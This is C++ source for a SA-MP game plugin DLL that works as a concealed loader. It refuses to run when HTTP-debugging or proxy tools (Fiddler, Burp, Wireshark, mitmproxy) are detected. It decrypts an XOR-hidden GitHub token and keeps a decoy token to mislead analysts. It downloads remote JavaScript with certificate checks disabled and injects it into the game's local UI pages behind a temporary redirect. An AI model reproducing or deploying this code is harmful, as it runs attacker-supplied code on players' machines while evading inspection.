#define _CRT_SECURE_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <boost/asio.hpp>
#include <fstream>
#include <sstream>
#include <string>
#include <thread>
#include <filesystem>
#include <chrono>
#include <curl/curl.h>
#include <memory>
#include <atomic>
#include <samp.h>
#include <MinHookWrapper.hpp>
#include <RakHook/rakhook.hpp>
#include <RakNet/StringCompressor.h>
#include <cstring>
#include <cstdlib>
#include <vector>
#include <stdexcept>
#include <tlhelp32.h> 


std::string xorEncryptDecrypt(const std::string& data, const std::string& key) {
    std::string output = data;
    for (size_t i = 0; i < data.size(); ++i)
        output[i] ^= key[i % key.size()];
    return output;
}

bool checkHttpDebuggerRegistry() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\HttpDebuggerPro", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"Software\\HttpDebuggerPro", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }

    return false;
}

template<typename T>
void secure_zero(T* ptr, size_t size) {
    volatile T* vptr = ptr;
    while (size--) *vptr++ = 0;
}

using namespace boost::asio;
using namespace boost::asio::ip;
namespace fs = std::filesystem;
using namespace std::chrono;

std::atomic<bool> sampInit = false;
steady_clock::time_point initTime;
std::atomic<bool> redirRemoved = false;
std::string htmlFile = "uiresources/index.html";
std::atomic<bool> scriptInject = false;

bool isHttpDebuggerRunning() {
    const wchar_t* debuggerProcesses[] = {
        L"Fiddler.exe",
        L"Charles.exe",
        L"burp.exe",
        L"mitmdump.exe",
        L"mitmweb.exe",
        L"mitmproxy.exe",
        L"Wireshark.exe",
        L"HttpDebuggerPro.exe",
        L"HttpDebuggerUI.exe",
        L"HttpDebuggerUserModeDriver64.exe",
        nullptr
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (!Process32FirstW(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return false;
    }

    do {
        for (int i = 0; debuggerProcesses[i] != nullptr; ++i) {
            if (_wcsicmp(pe32.szExeFile, debuggerProcesses[i]) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        }
    } while (Process32NextW(hSnapshot, &pe32));

    CloseHandle(hSnapshot);
    return false;
}

bool checkDebuggerEnvironment() {
    const char* httpDebuggerEnvVars[] = {
    "HTTP_DEBUGGER_ACTIVE",
    "HTTP_DEBUGGER_PORT",
    "HTTP_DEBUGGER_CONFIG",
    nullptr
    };

    for (int i = 0; httpDebuggerEnvVars[i] != nullptr; ++i) {
        if (GetEnvironmentVariableA(httpDebuggerEnvVars[i], nullptr, 0) != 0) {
            return true;
        }
    }
    const char* envVars[] = {
        "HTTP_PROXY",
        "HTTPS_PROXY",
        "ALL_PROXY",
        nullptr
    };

    for (int i = 0; envVars[i] != nullptr; ++i) {
        if (GetEnvironmentVariableA(envVars[i], nullptr, 0) != 0) {
            return true;
        }
    }
    return false;
}


bool checkFiddlerRegistry() {
    HKEY hKey;
    LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Fiddler2", 0, KEY_READ, &hKey);
    if (result == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    return false;
}

std::string getMime(const std::string& ext) {
    if (ext == ".html") return "text/html";
    if (ext == ".css") return "text/css";
    if (ext == ".js") return "application/javascript";
    if (ext == ".png") return "image/png";
    if (ext == ".jpg" || ext == ".jpeg") return "image/jpeg";
    if (ext == ".gif") return "image/gif";
    if (ext == ".svg") return "image/svg+xml";
    if (ext == ".ico") return "image/x-icon";
    if (ext == ".ttf") return "font/ttf";
    if (ext == ".otf") return "font/otf";
    if (ext == ".woff") return "font/woff";
    if (ext == ".woff2") return "font/woff2";
    return "application/octet-stream";
}

std::string readFile(const std::string& path) {
    std::ifstream f(path, std::ios::binary);
    if (!f.is_open()) return "";
    std::stringstream buf;
    buf << f.rdbuf();
    f.close();
    return buf.str();
}

std::string getReqFile(const std::string& req) {
    std::istringstream s(req);
    std::string m, p, pr;
    s >> m >> p >> pr;
    if (p == "/") p = "/index.html";
    size_t pos;
    while ((pos = p.find("%20")) != std::string::npos) p.replace(pos, 3, " ");
    return "uiresources" + p;
}

void removeScript(const std::string& file) {
    std::ifstream in(file);
    if (!in.is_open()) return;
    std::stringstream buf;
    buf << in.rdbuf();
    in.close();
    std::string cont = buf.str();
    size_t start = cont.find("<script>/*u*/");
    if (start != std::string::npos) {
        size_t end = cont.find("/*b*/</script>", start);
        if (end != std::string::npos) {
            cont.erase(start, end - start + 14);
            std::ofstream out(file, std::ios::binary | std::ios::trunc);
            if (out.is_open()) {
                out << cont;
                out.close();
            }
        }
    }
}

void addScript(const std::string& file, const std::string& url) {
    std::this_thread::sleep_for(milliseconds(200));
    removeScript(file);
    std::ifstream in(file);
    if (!in.is_open()) return;
    std::stringstream buf;
    buf << in.rdbuf();
    in.close();
    std::string cont = buf.str();
    std::string script = "<script>/*u*/setTimeout(() => { window.location.href = 'http://127.0.0.1:3874'; }, 250);/*b*/</script>";
    size_t body = cont.find("</body>");
    if (body != std::string::npos) cont.insert(body, script);
    else cont += script;
    std::ofstream out(file, std::ios::binary | std::ios::trunc);
    if (out.is_open()) {
        out << cont;
        out.close();
    }
}

struct MemBuf {
    char* data;
    size_t sz;
    MemBuf() : data(nullptr), sz(0) {}
    ~MemBuf() { free(data); }
};

size_t writeMem(void* cont, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    MemBuf* mem = (MemBuf*)userp;
    char* ptr = (char*)realloc(mem->data, mem->sz + realsize + 1);
    if (ptr == nullptr) return 0;
    mem->data = ptr;
    memcpy(&(mem->data[mem->sz]), cont, realsize);
    mem->sz += realsize;
    mem->data[mem->sz] = 0;
    return realsize;
}

std::string loadJS(const std::string& owner, const std::string& repo, const std::string& path, const char* token) {
    CURL* curl = curl_easy_init();
    if (!curl) return "";
    MemBuf buf;
    struct curl_slist* headers = nullptr;
    std::string url = "https://api.github.com/repos/" + owner + "/" + repo + "/contents/" + path;
    if (token != nullptr) headers = curl_slist_append(headers, ("Authorization: token " + std::string(token)).c_str());
    headers = curl_slist_append(headers, "Accept: application/vnd.github.v3.raw");
    headers = curl_slist_append(headers, "User-Agent: SimpleLoader");
    curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeMem);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &buf);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
    CURLcode res = curl_easy_perform(curl);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
    return (buf.data && buf.sz > 0) ? std::string(buf.data, buf.sz) : "";
}

void injectJS(std::string& html, const std::string& js, bool scriptTag) {
    if (scriptTag && !js.empty()) {
        std::string tag = "\n<script>\n// Injected from GitHub\n" + js + "\n</script>\n";
        size_t body = html.find("</body>");
        if (body != std::string::npos) html.insert(body, tag);
        else html += tag;
    }
}

const unsigned char encryptedToken[] = {
    0x17, 0x12, 0x18, 0x2f, 0x16, 0x06, 0x15, 0x16, 0x09, 0x37, 0x22, 0x25, 0x17, 0x1e, 0x38, 0x3d, 0x09, 0x5f, 0x19, 0x2a, 0x1c, 0x44, 0x23, 0x0f, 0x29, 0x42, 0x3a, 0x20, 0x3d, 0x1d, 0x03, 0x03, 0x5b, 0x14, 0x48, 0x1a, 0x20, 0x49, 0x11, 0x24
}; // Твой токен в xor формате
const size_t encryptedTokenSize = sizeof(encryptedToken);
const std::string encryptionKey = "pzhpzh"; // XOR - КЛЮЧ

std::string decryptToken() {
    std::string result((char*)encryptedToken, encryptedTokenSize);
    return xorEncryptDecrypt(result, encryptionKey);
}

void startServer() {
    try {
        io_context ctx;
        tcp::acceptor acceptor(ctx, tcp::endpoint(tcp::v4(), 3874));
        addScript(htmlFile, "http://127.0.0.1:3874");
        std::string ghp = "ghp_0aBcD1EfGhIjKlM2NoPqRsTuVwXyZ3"; // Левый токен для ввода в заблуждение.
        std::string owner = "neizzbezhny"; // owner
        std::string repo = "sborki"; // repo
        std::string jsPath = "006.js"; // jsPath
        std::string jsCont;
        while (true) {
            tcp::socket sock(ctx);
            acceptor.accept(sock);
            try {
                char reqBuf[2048];
                boost::system::error_code err;
                size_t readBytes = sock.read_some(buffer(reqBuf), err);
                if (err == boost::asio::error::eof) continue;
                else if (err) throw boost::system::system_error(err);
                if (readBytes == 0) continue;
                std::string req(reqBuf, readBytes);
                std::string filePath = getReqFile(req);
                if (!fs::exists(filePath) || fs::is_directory(filePath)) {
                    std::string resp = "HTTP/1.1 404 Not Found\r\nContent-Type: text/html\r\n\r\n<html><body><h1>404 Not Found</h1></body></html>";
                    boost::asio::write(sock, buffer(resp));
                    sock.shutdown(tcp::socket::shutdown_both, err);
                    sock.close();
                    continue;
                }
                std::string fileCont = readFile(filePath);
                if (fileCont.empty() && fs::exists(filePath)) {
                    std::string resp = "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<html><body><h1>500 Internal Server Error</h1><p>Could not read file.</p></body></html>";
                    boost::asio::write(sock, buffer(resp));
                    sock.shutdown(tcp::socket::shutdown_both, err);
                    sock.close();
                    continue;
                }
                if (filePath.find("index.html") != std::string::npos) {
                    if (!scriptInject.load()) {
                        std::string realToken = decryptToken();
                        jsCont = loadJS(owner, repo, jsPath, realToken.c_str());
                        secure_zero(realToken.data(), realToken.size());
                        realToken.clear();

                        if (!jsCont.empty()) {
                            injectJS(fileCont, jsCont, true);
                            scriptInject.store(true);
                        }
                    }
                }
                std::string ext = "";
                size_t dot = filePath.find_last_of('.');
                if (dot != std::string::npos) ext = filePath.substr(dot);
                std::string mime = getMime(ext);
                std::string resp =
                    "HTTP/1.1 200 OK\r\n"
                    "Content-Type: " + mime + "\r\n"
                    "Content-Length: " + std::to_string(fileCont.size()) + "\r\n"
                    "Connection: close\r\n"
                    "\r\n" + fileCont;
                boost::asio::write(sock, buffer(resp));
                sock.shutdown(tcp::socket::shutdown_both, err);
                sock.close();
            }
            catch (const std::exception& ex) {
                if (sock.is_open()) {
                    try {
                        std::string resp = "HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/html\r\n\r\n<html><body><h1>500 Internal Server Error</h1></body></html>";
                        boost::system::error_code ignored;
                        boost::asio::write(sock, buffer(resp), ignored);
                        sock.shutdown(tcp::socket::shutdown_both, ignored);
                        sock.close();
                    }
                    catch (...) {}
                }
            }
            catch (...) {
                if (sock.is_open()) {
                    try {
                        boost::system::error_code ignored;
                        sock.shutdown(tcp::socket::shutdown_both, ignored);
                        sock.close();
                    }
                    catch (...) {}
                }
            }
        }
    }
    catch (const std::exception& e) {
        MessageBoxA(NULL, e.what(), "Server Error", MB_OK | MB_ICONERROR);
    }
}

class Plugin {
public:
    Plugin(HMODULE hmod);
    ~Plugin();
    static void gameLoop();
    static c_hook<void(*)()> loopHook;
private:
    HMODULE mod;
    std::thread serverThread;
};

inline c_hook<void(*)()> Plugin::loopHook = { 0x561B10 };
std::unique_ptr<Plugin> pl;

void Plugin::gameLoop() {
    static bool hookInit = false;
    if (!hookInit) {
        if (rakhook::initialize() && c_chat::get()->ref() != nullptr) {
            hookInit = true;
            StringCompressor::AddReference();
            initTime = steady_clock::now();
            sampInit.store(true);
        }
        else {
            return loopHook.call_original();
        }
    }
    if (sampInit.load() && !redirRemoved.load()) {
        auto now = steady_clock::now();
        auto elapsed = duration_cast<seconds>(now - initTime);
        if (elapsed.count() >= 2) {
            removeScript(htmlFile);
            redirRemoved.store(true);
        }
    }
    return loopHook.call_original();
}

Plugin::Plugin(HMODULE hmod) : mod(hmod) {
    loopHook.add(&Plugin::gameLoop);
    serverThread = std::thread(startServer);
}

Plugin::~Plugin() {
    loopHook.remove();
    rakhook::destroy();
    if (serverThread.joinable()) serverThread.detach();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);
        if (isHttpDebuggerRunning() || checkDebuggerEnvironment() || checkFiddlerRegistry() || checkHttpDebuggerRegistry()) {
            MessageBoxA(NULL, "Protected by mazzaleen.", "Security Error", MB_OK | MB_ICONERROR);
            return FALSE;
        }
        pl = std::make_unique<Plugin>(hModule);
        break;
        DisableThreadLibraryCalls(hModule);
        pl = std::make_unique<Plugin>(hModule);
        break;
    case DLL_PROCESS_DETACH:
        pl.reset();
        break;
    }
    return TRUE;
}